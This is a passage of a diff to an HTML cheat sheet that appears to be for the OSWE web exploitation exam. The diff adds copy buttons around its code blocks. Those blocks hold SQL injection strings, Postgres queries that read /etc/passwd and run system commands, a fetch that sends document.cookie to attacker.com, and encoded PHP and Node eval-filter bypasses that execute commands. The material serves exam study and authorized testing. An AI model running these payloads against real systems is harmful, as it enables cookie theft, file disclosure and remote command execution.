+            <pre><code class="language-sql">INSERT INTO users (id, name) VALUES (1, 'test') INTO OUTFILE '/tmp/test.txt' -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>Use comments like <code>/*comment*/</code>, case variations, or encodings like <code>UN/**/ION SEL/**/ECT</code>.</p>
-        <pre><code class="language-sql">'; DROP TABLE users; -- -</code></pre>
+        <div class="code-container">
+            <pre><code class="language-sql">'; DROP TABLE users; -- -</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="basic-postgres-commands">Basic Postgres Commands</h3>
-        <pre><code class="language-sql">SELECT datname FROM pg_database;</code></pre>
-        <pre><code class="language-sql">SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';</code></pre>
-        <pre><code class="language-sql">SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'your_table';</code></pre>
-        <pre><code class="language-sql">SELECT * FROM your_table;</code></pre>
-        <pre><code class="language-sql">INSERT INTO your_table (column1, column2) VALUES ('value1', 'value2');</code></pre>
-        <pre><code class="language-sql">UPDATE your_table SET column1 = 'new_value' WHERE condition_column = 'condition_value';</code></pre>
-        <pre><code class="language-sql">DELETE FROM your_table WHERE condition_column = 'condition_value';</code></pre>
-        <pre><code class="language-sql">DROP TABLE your_table;</code></pre>
-        <pre><code class="language-sql">SELECT current_user;</code></pre>
-        <pre><code class="language-sql">SELECT version();</code></pre>
-        <pre><code class="language-sql">SELECT pg_sleep(5);</code></pre>
-        <pre><code class="language-sql">SELECT pg_read_file('/etc/passwd');</code></pre>
-        <pre><code class="language-sql">COPY (SELECT 'data') TO '/tmp/test.txt';</code></pre>
-        <pre><code class="language-sql">CREATE EXTENSION IF NOT EXISTS plperlu; SELECT system('ls');</code></pre>
-        <pre><code class="language-sql">SELECT schema_name FROM information_schema.schemata;</code></pre>
-        <pre><code class="language-sql">SELECT usename FROM pg_user;</code></pre>
-        <pre><code class="language-sql">SELECT current_database();</code></pre>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT datname FROM pg_database;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'your_table';</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT * FROM your_table;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">INSERT INTO your_table (column1, column2) VALUES ('value1', 'value2');</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">UPDATE your_table SET column1 = 'new_value' WHERE condition_column = 'condition_value';</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">DELETE FROM your_table WHERE condition_column = 'condition_value';</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">DROP TABLE your_table;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT current_user;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT version();</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT pg_sleep(5);</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT pg_read_file('/etc/passwd');</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">COPY (SELECT 'data') TO '/tmp/test.txt';</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">CREATE EXTENSION IF NOT EXISTS plperlu; SELECT system('ls');</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT schema_name FROM information_schema.schemata;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT usename FROM pg_user;</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-sql">SELECT current_database();</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="javascript-code-snippets">JavaScript Code Snippets</h2>
 
         <h3 id="basic-fetch-request">Basic Fetch Request</h3>
-        <pre><code class="language-javascript">fetch('https://example.com/api/data')
+        <div class="code-container">
+            <pre><code class="language-javascript">fetch('https://example.com/api/data')
   .then(response => {
     if (!response.ok) {
       throw new Error('Network response was not ok');
@@ -1705,9 +2009,12 @@ req2.send();
   .then(data => console.log(data))
   .catch(error => console.error('Error:', error));
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="fetch-with-headers-and-body">Fetch with Headers and Body</h3>
-        <pre><code class="language-javascript">fetch('https://example.com/api/post', {
+        <div class="code-container">
+            <pre><code class="language-javascript">fetch('https://example.com/api/post', {
   method: 'POST',
   headers: {
     'Content-Type': 'application/json',
@@ -1722,17 +2029,23 @@ req2.send();
   .then(data => console.log(data))
   .catch(error => console.error('Error:', error));
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="fetch-cookies-and-send-to-remote">Fetch Cookies and Send to Remote</h3>
-        <pre><code class="language-javascript">fetch('http://attacker.com/steal?c=' + encodeURIComponent(document.cookie), {
+        <div class="code-container">
+            <pre><code class="language-javascript">fetch('http://attacker.com/steal?c=' + encodeURIComponent(document.cookie), {
   mode: 'no-cors'
 })
   .then(() => console.log('Cookies sent'))
   .catch(error => console.error('Error:', error));
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="websocket-client-1">WebSocket Client</h3>
-        <pre><code class="language-javascript">const socket = new WebSocket('ws://example.com/ws');
+        <div class="code-container">
+            <pre><code class="language-javascript">const socket = new WebSocket('ws://example.com/ws');
 
 socket.onopen = function(event) {
   console.log('Connection opened');
@@ -1751,44 +2064,100 @@ socket.onerror = function(error) {
   console.error('Error:', error);
 };
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="bypass-php-eval-filtering">Bypass PHP Eval Filtering</h2>
-        <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
+        <div class="code-container">
+            <pre><code class="language-php">get_defined_functions()['internal'][array_search(urldecode("%65%78%65%63"), get_defined_functions()['internal'])]("whoami");
 (new ReflectionFunction(hex2bin("65786563")))->invoke('hostname');
 </code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="bypass-javascript-injection-filters">Bypass Javascript Injection Filters</h2>
-        <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //"</code></pre>
-        <pre><code class="language-javascript">(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
+        <div class="code-container">
+            <pre><code class="language-javascript">(function(){module.constructor._load(Buffer.from('6368696c645f70726f63657373','hex').toString()).execSync('ping -c 2');})(); //"</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-javascript">(function(){module.constructor._load(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115)).execSync('ping -c 2');})();//"</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="ysoserial-payload-creation">YSOSerial Payload Creation</h2>
 
         <h3 id="net-version">.NET Version</h3>
-        <pre><code class="language-bash">https://github.com/pwntester/ysoserial.net</code></pre>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/pwntester/ysoserial.net</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h3 id="java-version">JAVA Version</h3>
-        <pre><code class="language-bash">https://github.com/frohoff/ysoserial</code></pre>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/frohoff/ysoserial</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="report-recommendations">Report Recommendations</h2>
         <p>For code indentation:</p>
-        <pre><code class="language-bash">Copy the code straight from VS Code into a 1x1 table in Word</code></pre>
+        <div class="code-container">
+            <pre><code class="language-bash">Copy the code straight from VS Code into a 1x1 table in Word</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
 
         <h2 id="additional-resources">Additional Resources</h2>
         <p>While the course material and labs should be enough to pass the exam, if you want further practice, I can recommend the following:</p>
-        <pre><code class="language-bash">https://github.com/yeswehack/vulnerable-code-snippets</code></pre>
-        <pre><code class="language-bash">https://github.com/bmdyy/order</code></pre>
-        <pre><code class="language-bash">https://github.com/bmdyy/chat.js</code></pre>
-        <pre><code class="language-bash">https://github.com/bmdyy/tudo</code></pre>
-        <pre><code class="language-bash">https://github.com/bmdyy/testr</code></pre>
-        <pre><code class="language-bash">https://github.com/TROUBLE-1/White-box-pentesting</code></pre>
-        <pre><code class="language-bash">https://www.vulnhub.com/entry/securecode-1,651</code></pre>
-        <pre><code class="language-bash">https://github.com/takito1812/web-hacking-playground</code></pre>
-        <pre><code class="language-bash">https://pentesterlab.com/badges/codereview (paid)</code></pre>
-        <pre><code class="language-bash">https://github.com/b1d0ws/OSWE</code></pre>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/yeswehack/vulnerable-code-snippets</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/bmdyy/order</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/bmdyy/chat.js</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/bmdyy/tudo</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/bmdyy/testr</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/TROUBLE-1/White-box-pentesting</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">https://www.vulnhub.com/entry/securecode-1,651</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/takito1812/web-hacking-playground</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">https://pentesterlab.com/badges/codereview (paid)</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
+        <div class="code-container">
+            <pre><code class="language-bash">https://github.com/b1d0ws/OSWE</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>Regex Learning:</p>
-        <pre><code class="language-bash">https://regexlearn.com/learn/</code></pre>
+        <div class="code-container">
+            <pre><code class="language-bash">https://regexlearn.com/learn/</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
         <p>Debug VM Recommended RDP Software</p>
-        <pre><code class="language-bash">https://www.nomachine.com/</code></pre>
+        <div class="code-container">
+            <pre><code class="language-bash">https://www.nomachine.com/</code></pre>
+            <button class="copy-btn">Copy</button>
+        </div>
     </main>
 
     <script>
@@ -1863,6 +2232,26 @@ socket.onerror = function(error) {
                     sidebar.classList.remove('active');
                     burger.classList.remove('active');
                     overlay.classList.remove('active');
+                });
+            });
+
+            // Copy functionality
+            const copyBtns = document.querySelectorAll('.copy-btn');
+            copyBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    const pre = this.previousElementSibling;
+                    const code = pre.querySelector('code');
+                    const text = code.innerText;
+                    navigator.clipboard.writeText(text).then(() => {
+                        this.textContent = 'Copied!';
+                        this.classList.add('copied');
+                        setTimeout(() => {
+                            this.textContent = 'Copy';
+                            this.classList.remove('copied');
+                        }, 2000);
+                    }).catch(err => {
+                        console.error('Failed to copy: ', err);
+                    });
                 });
             });
         });
